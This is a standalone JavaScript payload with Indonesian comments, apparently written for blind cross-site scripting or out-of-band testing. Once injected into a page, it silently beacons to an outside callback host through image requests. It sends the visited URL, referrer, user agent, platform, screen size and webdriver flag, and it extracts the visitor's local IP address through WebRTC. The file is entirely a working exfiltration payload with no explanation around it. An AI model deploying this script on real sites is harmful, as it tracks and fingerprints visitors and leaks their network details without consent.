(function() {
    var BASE = "http://ytn2pe31.instances.httpworkbench.com/"; // Ganti dengan domain OAST Anda
    function send(key, value) {
        try {
            var v = String(value).substring(0, 1000);
            new Image().src = BASE + "?" + encodeURIComponent(key) + "=" + encodeURIComponent(v);
        } catch(e) {}
    }

    // Kirim data utama: referrer, lokasi, dan environment
    send('js_exec', 'true');
    send('referrer', document.referrer || 'no_referrer');
    send('location', window.location.href);
    send('ua', navigator.userAgent);
    send('webdriver', navigator.webdriver);
    send('platform', navigator.platform);
    send('screen', screen.width + 'x' + screen.height);

    // Coba IP lokal via WebRTC
    try {
        var pc = new RTCPeerConnection({iceServers:[]});
        pc.createDataChannel('');
        pc.createOffer().then(function(offer) { pc.setLocalDescription(offer); });
        pc.onicecandidate = function(e) {
            if (e && e.candidate && e.candidate.candidate) {
                var parts = e.candidate.candidate.split(' ');
                for (var i = 0; i < parts.length; i++) {
                    if (parts[i] === 'typ' && parts[i+1] === 'host') {
                        send('local_ip', parts[i-1]);
                        pc.close();
                        return;
                    }
                }
            }
        };
        setTimeout(function() { pc.close(); send('local_ip', 'timeout'); }, 3000);
    } catch(e) { send('webrtc_error', e.message); }

    send('done', '1');
})();
